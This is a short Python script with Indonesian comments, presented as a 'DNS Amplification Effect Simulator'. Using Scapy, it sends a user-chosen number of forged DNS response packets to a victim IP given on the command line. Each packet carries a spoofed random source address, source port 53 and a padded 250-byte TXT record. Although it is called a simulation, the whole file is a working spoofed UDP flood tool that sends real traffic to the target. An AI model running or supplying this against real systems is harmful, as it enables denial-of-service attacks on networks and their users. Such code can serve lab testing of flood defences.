# dns_amp_simulator.py
# Skrip untuk mensimulasikan banjir balasan DNS (efek dari DNS Amplification)

import argparse
import time
import random
from scapy.all import IP, UDP, DNS, DNSRR, send, RandIP

def main():
    parser = argparse.ArgumentParser(description="DNS Amplification Effect Simulator")
    parser.add_argument("-t", "--target", required=True, help="Alamat IP korban")
    parser.add_argument("-c", "--count", type=int, default=1000, help="Jumlah paket yang akan dikirim")

    args = parser.parse_args()

    target_ip = args.target
    packet_count = args.count

    print(f"[*] Mensimulasikan banjir balasan DNS ke {target_ip}")
    print(f"[*] Akan mengirim {packet_count} paket.")

    # Membuat payload DNS response fiktif
    # qr=1 menandakan ini adalah sebuah "response"
    # Kita membuat record TXT dengan data besar untuk mensimulasikan amplifikasi
    dns_response = DNS(
        id=0xAAAA,
        qr=1,
        aa=1,
        ancount=1,
        an=DNSRR(
            rrname="victim.com.",
            type='TXT',
            rdata='X'*250 # Payload besar untuk simulasi amplifikasi
        )
    )

    for i in range(packet_count):
        # Membuat paket IP
        # src=RandIP() akan memalsukan IP sumber dengan IP acak setiap kali
        # Ini mensimulasikan balasan yang datang dari banyak server berbeda
        ip_packet = IP(src=RandIP(), dst=target_ip)

        # Membuat paket UDP
        # sport=53 menandakan paket ini datang dari port DNS
        udp_packet = UDP(sport=53, dport=random.randint(1025, 65535))

        # Menggabungkan semua menjadi satu paket
        full_packet = ip_packet / udp_packet / dns_response

        # Mengirim paket
        send(full_packet, verbose=False)

        print(f"\r[*] Paket terkirim: {i + 1}/{packet_count}", end="")

    print(f"\n[*] Simulasi selesai. {packet_count} paket telah dikirim.")


if __name__ == "__main__":
    main()
